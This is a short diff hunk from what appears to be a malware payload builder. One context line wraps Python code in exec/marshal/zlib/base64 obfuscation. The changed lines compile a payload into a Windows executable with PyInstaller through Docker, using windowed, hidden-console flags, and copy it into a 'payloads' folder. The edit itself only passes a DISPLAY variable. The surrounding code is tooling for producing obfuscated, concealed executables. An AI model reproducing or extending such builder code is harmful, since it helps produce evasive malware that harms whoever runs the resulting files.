@@ -244,7 +244,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
 
         if os_name == "Windows":
-            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
             print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
